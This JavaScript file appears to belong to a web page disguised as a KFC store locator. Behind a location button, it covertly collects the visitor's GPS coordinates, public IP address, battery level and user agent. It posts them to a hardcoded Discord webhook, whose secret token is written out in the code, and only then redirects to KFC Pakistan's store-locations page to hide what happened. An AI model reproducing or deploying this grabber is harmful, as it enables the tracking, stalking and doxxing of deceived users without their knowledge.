document.getElementById('getLocationBtn').addEventListener('click', function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(handlePosition, showError);
    } else {
        document.getElementById('locationOutput').innerText = "Geolocation is not supported by this browser.";
    }
});

function handlePosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    
    sendToDiscord(latitude, longitude, function() {
        redirectToKFCWebsite();
    });
}

function showError(error) {
    var errorMessage;
    switch(error.code) {
        case error.PERMISSION_DENIED:
            errorMessage = "User denied the request for Geolocation.";
            break;
        case error.POSITION_UNAVAILABLE:
            errorMessage = "Location information is unavailable.";
            break;
        case error.TIMEOUT:
            errorMessage = "The request to get user location timed out.";
            break;
        case error.UNKNOWN_ERROR:
            errorMessage = "An unknown error occurred.";
            break;
    }
    document.getElementById('locationOutput').innerText = errorMessage;
}

function sendToDiscord(latitude, longitude, callback) {
    var webhookUrl = 'https://discord.com/api/webhooks/1242194300838613012/VdP9q1fwTq_-n95AUMhoToMCvASepg1ILhLM9X4GgADYsNG1uKkV_lxYVTZD8X7sx4sO';
    var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    var ip = 'Not Available';
    var batteryPercentage = 'Not Available';
    var userAgent = navigator.userAgent;

    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            batteryPercentage = (battery.level * 100).toFixed(2) + '%';
            sendMessage(webhookUrl, latitude, longitude, googleMapsLink, ip, batteryPercentage, userAgent, callback);
        });
    } else {
        sendMessage(webhookUrl, latitude, longitude, googleMapsLink, ip, batteryPercentage, userAgent, callback);
    }
}

function sendMessage(webhookUrl, latitude, longitude, googleMapsLink, ip, batteryPercentage, userAgent, callback) {
    fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        ip = data.ip;
        var message = {
            content: `User's location: ${googleMapsLink}\nIP Address: ${ip}\nBattery Percentage: ${batteryPercentage}\nUser Agent: ${userAgent}`
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        })
        .then(response => {
            if (response.ok) {
                callback();
            } else {
                console.error('Error:', response.statusText);
            }
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    })
    .catch((error) => {
        console.error('Error:', error);
    });
}

function redirectToKFCWebsite() {
    window.location.href = 'https://www.kfcpakistan.com/store-locations';
}
